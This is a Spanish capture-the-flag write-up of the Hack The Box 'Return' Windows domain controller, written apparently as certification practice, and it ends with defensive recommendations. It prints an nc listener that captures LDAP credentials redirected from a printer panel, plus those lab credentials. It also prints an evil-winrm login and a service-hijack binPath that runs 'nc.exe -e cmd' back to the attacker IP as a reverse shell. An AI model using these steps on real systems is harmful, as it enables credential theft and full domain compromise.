# Return — Hack The Box (práctica CPTS)

**Plataforma:** Hack The Box
**Dificultad:** 🟢 Fácil
**SO:** Windows (Active Directory)
**Certificación:** Práctica adicional para el CPTS (Certified Penetration Testing Specialist)
**Fecha de resolución:** 2026
**Técnicas:** Nmap · Panel web de impresora con configuración LDAP manipulable · Captura de credenciales en texto claro con un listener `nc` · Evil-WinRM · Grupo **Server Operators** · **Service hijacking** (`sc.exe config` sobre `VGAuthService`) → SYSTEM
**Idioma:** Español — [🇬🇧 English version](./Return_Writeup_EN.md)

---

## Índice
1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración del panel web de la impresora](#2-enumeración-del-panel-web-de-la-impresora)
3. [Acceso inicial — captura de credenciales con un listener](#3-acceso-inicial--captura-de-credenciales-con-un-listener)
4. [Obtención de shell — grupo Server Operators](#4-obtención-de-shell--grupo-server-operators)
   - [Escalada de privilegios — Service hijacking](#escalada-de-privilegios--service-hijacking)
5. [Post-explotación y flags](#5-post-explotación-y-flags)
6. [Lección aprendida](#6-lección-aprendida)
7. [Glosario de herramientas y comandos](#7-glosario-de-herramientas-y-comandos)

---

## 1. Reconocimiento

```bash
ping -c 1 10.129.73.55
```

> 🛠️ **`ping`** — comprueba disponibilidad del host por ICMP. TTL **127** → sistema **Windows**.

![](Imagenes/01-ping.png)

Escaneo completo de puertos TCP:

```bash
nmap -sS -Pn -vvv --min-rate 5000 --open -n -p- -oN AllPorts 10.129.73.55
```

> 🛠️ **`nmap -sS -Pn -vvv --min-rate 5000 --open -n -p-`** — escaneo SYN de los 65535 puertos: `-sS` (sigiloso), `-Pn` (ignora el estado del ping), `--min-rate 5000` (acelera el envío), `--open` (solo puertos abiertos), `-n` (sin resolución DNS).

![](Imagenes/02-nmap-allports.png)

```bash
enum-nmap AllPorts
```

> 🛠️ **`enum-nmap`** — script propio que resume la salida de Nmap: IP, TTL, SO estimado y lista de puertos lista para el siguiente `-p`.

![](Imagenes/03-enum-nmap-herramienta-propia.png)

> 💡 26 puertos abiertos, entre ellos **53 (DNS), 80 (HTTP), 88 (Kerberos), 389/636/3268/3269 (LDAP/LDAPS/Global Catalog), 445 (SMB) y 5985/47001 (WinRM)** — el conjunto de servicios característico de un **controlador de dominio de Active Directory**, además de un servicio web inusual en el puerto 80.

Escaneo de versión y scripts por defecto:

```bash
nmap -sS -Pn -sCV -T5 -n -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49674,49675,49678,49682,49694 -oN Ports 10.129.73.55
```

> 🛠️ **`-sCV`** combina `-sC` (scripts por defecto de Nmap) con `-sV` (detección de versión de servicio).

![](Imagenes/04-nmap-version-servicios-dc.png)

```
80/tcp  open  http  Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
389/tcp open  ldap  Microsoft Windows Active Directory LDAP (Domain: return.local, ...)
Service Info: Host: PRINTER; OS: Windows
```

> 💡 Dominio **`return.local`**, hostname **`PRINTER`**. El puerto 80 aloja un panel de administración de una **impresora corporativa** — el título ya adelanta la temática de la máquina.

## 2. Enumeración del panel web de la impresora

Accedemos al panel web:

![](Imagenes/05-panel-web-printer-home.png)

En el menú **Settings** encontramos el formulario de configuración del cliente LDAP que la impresora usa para autenticar usuarios contra el dominio:

```
http://10.129.73.55/settings.php
```

![](Imagenes/06-settings-printer-original.png)

```
Server Address: printer.return.local
Server Port:    389
Username:       svc-printer
Password:       *******
```

> 🛠️ **`settings.php`** — formulario de configuración típico de un dispositivo multifunción/impresora corporativa: almacena una cuenta de servicio de dominio (`svc-printer`) que usa para hacer *bind* LDAP contra el servidor indicado en **Server Address**, sin validar ese destino.

> 💡 El campo **Server Address** acepta cualquier IP arbitraria sin ninguna validación. Cuando se pulsa **Update**, la aplicación realiza una conexión LDAP hacia esa dirección y envía las credenciales del *bind* (usuario y contraseña de `svc-printer`) — si apuntamos ese campo a nuestra propia máquina, recibimos directamente esas credenciales.

## 3. Acceso inicial — captura de credenciales con un listener

### ¿Por qué basta con `nc` para capturar credenciales LDAP?

El protocolo LDAP usa codificación binaria ASN.1/BER para sus mensajes, por lo que una captura con `nc` no es "texto plano" en el sentido estricto. Sin embargo, dentro de una operación **`bindRequest`** (inicio de sesión), los campos `name` (el DN o nombre de usuario) y `simple` (la contraseña, en el *simple bind*) se codifican como cadenas de bytes **sin cifrar ni ofuscar** — solo precedidas de unos pocos bytes de control del formato ASN.1. Eso significa que, aunque no sea un LDAP "real" al otro lado, un simple listener TCP que muestre los bytes recibidos es suficiente para leer usuario y contraseña a simple vista, sin necesidad de implementar el protocolo LDAP completo ni usar herramientas especializadas.

Levantamos el listener en el puerto 389/TCP:

```bash
nc -lvnp 389
```

> 🛠️ **`nc -lvnp 389`** — Netcat en modo escucha (`-l`) en el puerto `389` (el que la impresora ya tiene configurado por defecto), mostrando toda conexión y los bytes recibidos. No se necesita implementar LDAP: el *bind* llega igualmente y sus campos de usuario/contraseña son legibles.

![](Imagenes/07-nc-listener-389.png)

En el panel web, cambiamos **Server Address** de `printer.return.local` a nuestra IP de atacante y pulsamos **Update**:

![](Imagenes/08-settings-ip-modificada.png)

```
Server Address: 10.10.15.31
```

La impresora intenta autenticarse de inmediato contra nuestro listener, revelando las credenciales de `svc-printer` en claro:

![](Imagenes/09-nc-credenciales-capturadas.png)

```
connect to [10.10.15.31] from (UNKNOWN) [10.129.73.55] 64552
0*`%return\svc-printer@
                        1edFg43012!!
```

```
return\svc-printer : 1edFg43012!!
```

## 4. Obtención de shell — grupo Server Operators

Con las credenciales capturadas, autenticamos directamente por WinRM (puerto 5985, ya detectado en el escaneo inicial):

```bash
evil-winrm -i 10.129.73.55 -u 'svc-printer' -p '1edFg43012!!'
```

> 🛠️ **`evil-winrm`** — cliente para sesiones de administración remota de Windows (WinRM), equivalente en espíritu a SSH pero para PowerShell remoto.

![](Imagenes/10-evil-winrm-login-svc-printer.png)

Shell obtenida. Localizamos la primera flag:

```powershell
dir C:\Users\svc-printer\Desktop
```

![](Imagenes/11-dir-desktop-user-txt.png)

`user.txt` (34 bytes) confirmado en el escritorio de `svc-printer` — primera flag.

```powershell
whoami
```

![](Imagenes/12-whoami-svc-printer.png)

```
return\svc-printer
```

### Enumerando los grupos del usuario

```powershell
whoami /groups
```

> 🛠️ **`whoami /groups`** — lista todos los grupos (locales y de dominio) de los que es miembro el usuario actual, junto con su SID — el primer paso para detectar rutas de escalada de privilegios basadas en pertenencia a grupos.

![](Imagenes/13-whoami-groups-server-operators.png)

```
BUILTIN\Server Operators    Alias   S-1-5-32-549
```

### ¿Qué permite el grupo Server Operators?

![](Imagenes/14-server-operators-docs-microsoft.png)

> 💡 Según la propia documentación de Microsoft, **`Server Operators`** es un grupo integrado que existe únicamente en controladores de dominio y que, entre otros derechos, permite a sus miembros: iniciar sesión localmente en el DC, crear/eliminar recursos compartidos de red, **hacer backup/restore de ficheros** (saltándose ACLs vía `SeBackupPrivilege`) y, la clave de esta máquina, **detener e iniciar servicios del sistema**. En la práctica, es casi equivalente a administrador local del controlador de dominio.

## Escalada de privilegios — Service hijacking

La capacidad de **parar y arrancar servicios**, combinada con la de modificar su `binPath` (que cualquier operador de servicios puede hacer sobre un servicio existente), permite secuestrar cualquier servicio que arranque como `LocalSystem`.

Listamos los servicios instalados y sus rutas de ejecución:

```powershell
services
```

> 🛠️ **`services`** — comando propio de Evil-WinRM que lista los servicios de Windows junto con su ruta de ejecución (`Path`) y si el usuario actual tiene privilegios sobre ellos.

![](Imagenes/15-services-listado-vgauthservice.png)

```
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"   True   VGAuthService
```

> 💡 **`VGAuthService`** (parte de VMware Tools) arranca por defecto como `LocalSystem` y, al no estar protegido frente a reconfiguración por parte de `Server Operators`, es un candidato perfecto para *service hijacking*: basta con cambiar su `binPath` y reiniciarlo.

Preparamos el binario `nc.exe` (versión Windows de Netcat) que usaremos como payload:

```bash
locate nc.exe
```

![](Imagenes/16-locate-nc-exe.png)

Lo subimos a la víctima a través de la sesión Evil-WinRM:

```powershell
upload /ruta/local/nc.exe
```

> 🛠️ **`upload`** — comando propio de Evil-WinRM que transfiere un fichero local a la máquina víctima a través de la sesión WinRM ya autenticada, sin necesidad de un servidor adicional.

![](Imagenes/17-evil-winrm-upload-nc-exe.png)

### ¿Por qué funciona modificar el `binPath` de un servicio?

![](Imagenes/18-orchestrator-start-stop-service-docs.png)

Cada servicio de Windows tiene asociada, en el registro, una ruta de ejecución (`ImagePath`/`binPath`) que el **Service Control Manager (SCM)** invoca al arrancar el servicio — siempre con los privilegios de la cuenta configurada para ese servicio, que por defecto suele ser `LocalSystem`. `sc.exe config <servicio> binPath="..."` modifica esa ruta directamente. El SCM no valida que el nuevo binario implemente realmente el protocolo de control de servicios de Windows (inicio, parada, pausa) — simplemente lo ejecuta. Esto significa que si sustituimos el binario legítimo por cualquier otro ejecutable, el SCM lo lanzará igualmente **con los mismos privilegios** que tenía el servicio original, aunque ese binario "falle" como servicio inmediatamente después.

Modificamos el `binPath` de `VGAuthService` para que, al arrancar, ejecute `nc.exe` en modo cliente lanzando una shell `cmd.exe` hacia nuestra IP:

```powershell
sc.exe config VGAuthService binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.15.31 444"
```

> 🛠️ **`sc.exe config <servicio> binPath="..."`** — modifica la configuración de un servicio existente, incluida su ruta de ejecución. El espacio entre `binPath=` y el valor es obligatorio: `sc.exe` lo exige por compatibilidad histórica, y sin él el comando falla.

![](Imagenes/19-sc-config-vgauthservice-binpath.png)

```
[SC] ChangeServiceConfig SUCCESS
```

Preparamos un listener en nuestra máquina y reiniciamos el servicio para que cargue el nuevo `binPath`:

```bash
nc -lvnp 444
```

```powershell
sc.exe stop VGAuthService
sc.exe start VGAuthService
```

> 💡 El servicio "falla" al arrancar como servicio real (porque `nc.exe` no implementa el protocolo de control de servicios), pero eso ocurre **después** de que el SCM ya ejecutó el binario con privilegios de `LocalSystem` — tiempo más que suficiente para que la conexión reversa se establezca.

![](Imagenes/20-sc-stop-start-vgauthservice-nc-listener.png)

```
connect to [10.10.15.31] from (UNKNOWN) [10.129.73.55] 57675
Microsoft Windows [Version 10.0.17763.107]

C:\Windows\system32>
```

Confirmamos el contexto de ejecución:

```cmd
whoami
```

![](Imagenes/21-whoami-system.png)

```
nt authority\system
```

> 💡 **`NT AUTHORITY\SYSTEM`** es la cuenta más privilegiada de Windows. Al obtenerla en un **controlador de dominio**, el compromiso no se limita a la máquina: en la práctica equivale a comprometer el dominio completo (volcado de `NTDS.dit`, creación de Domain Admins, modificación de GPOs...).

## 5. Post-explotación y flags

```cmd
dir C:\Users\Administrator\Desktop
```

![](Imagenes/22-dir-desktop-administrator-root-txt.png)

`root.txt` (34 bytes) confirmado en el escritorio de Administrator — compromiso total del controlador de dominio.

> 🔒 El contenido exacto de `user.txt` y `root.txt` no se publica en este writeup a propósito, para no regalar la respuesta a quien esté practicando esta misma máquina — el camino completo hasta cada uno queda documentado en las secciones §4 y §5.

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| Panel web de impresora sin validación del destino LDAP configurado | `settings.php` | Permite redirigir el *bind* LDAP a un servidor controlado por el atacante |
| Credenciales de servicio de dominio almacenadas y enviadas en claro desde el panel | Cuenta `svc-printer` | Captura trivial de credenciales con un simple listener `nc` |
| Cuenta de servicio con acceso WinRM | `svc-printer` en `Remote Management Users` | RCE remoto directo vía Evil-WinRM |
| Cuenta de servicio miembro de `Server Operators` | Grupo nativo de Windows en el DC | Capacidad de modificar y reiniciar cualquier servicio del sistema |
| Servicios del sistema reconfigurables por `Server Operators` sin restricción adicional | `VGAuthService` | *Service hijacking* → ejecución arbitraria como `LocalSystem`/SYSTEM |

## Recomendaciones defensivas

- Validar el destino de cualquier configuración LDAP en paneles web de dispositivos (whitelist de hosts, verificación de certificado, DNS inverso).
- Forzar LDAPS (LDAP sobre TLS) en cualquier dispositivo que consulte el directorio corporativo, y deshabilitar el *simple bind* sin cifrar sobre el puerto 389.
- No usar cuentas de dominio privilegiadas para el *bind* de impresoras y dispositivos similares: cuentas de solo lectura, con alcance limitado a una OU.
- Restringir el acceso a paneles administrativos de impresoras a una red de gestión separada, con autenticación robusta.
- Auditar periódicamente la pertenencia a grupos sensibles (`Server Operators`, `Backup Operators`, `Print Operators`): solo las cuentas estrictamente necesarias.
- Aplicar el principio de mínimo privilegio en cuentas de servicio.
- Monitorizar `sc.exe config`, cambios en `ImagePath` del registro, y los eventos `7045`/`7036` del visor de sucesos, que reflejan modificaciones en servicios.

## 7. Glosario de herramientas y comandos

| Herramienta / comando | Para qué sirve |
|------------------------|-----------------|
| `ping` / `nmap` | Descubrimiento de host y enumeración de puertos/servicios |
| `enum-nmap` | Script propio que resume la salida de Nmap |
| **Panel web de impresora / `settings.php`** | Formulario típico de dispositivos multifunción que almacena credenciales de dominio para hacer *bind* LDAP contra un servidor configurable |
| `nc -lvnp <puerto>` | Netcat en modo escucha; suficiente para capturar un *bindRequest* LDAP, ya que sus campos de usuario/contraseña viajan sin cifrar dentro de la trama ASN.1 |
| `evil-winrm` | Cliente de sesiones remotas de administración de Windows (WinRM) |
| `whoami /groups` | Lista los grupos (locales y de dominio) del usuario actual con su SID |
| **`Server Operators`** | Grupo integrado de Windows, exclusivo de controladores de dominio, que permite (entre otros) detener/iniciar servicios y hacer backup/restore saltándose ACLs |
| `services` (Evil-WinRM) | Lista servicios de Windows con su ruta de ejecución y privilegios del usuario sobre ellos |
| `upload` (Evil-WinRM) | Transfiere un fichero local a la víctima a través de la sesión WinRM |
| `sc.exe config <servicio> binPath="..."` | Modifica la ruta de ejecución de un servicio existente; el SCM la invocará con los privilegios de la cuenta del servicio (normalmente `LocalSystem`) al arrancarlo, sin validar que el binario implemente el protocolo real de servicios |
| `sc.exe stop` / `sc.exe start` | Detiene/arranca un servicio, dando permisos de `Server Operators` para forzar la ejecución del nuevo `binPath` |
| `nc.exe -e cmd` | Variante Windows de Netcat; `-e` conecta una shell de comandos directamente a la conexión de red |

---

*Escrito por [Arabot](https://github.com/Caan31) · Hack The Box · práctica CPTS · 2026*
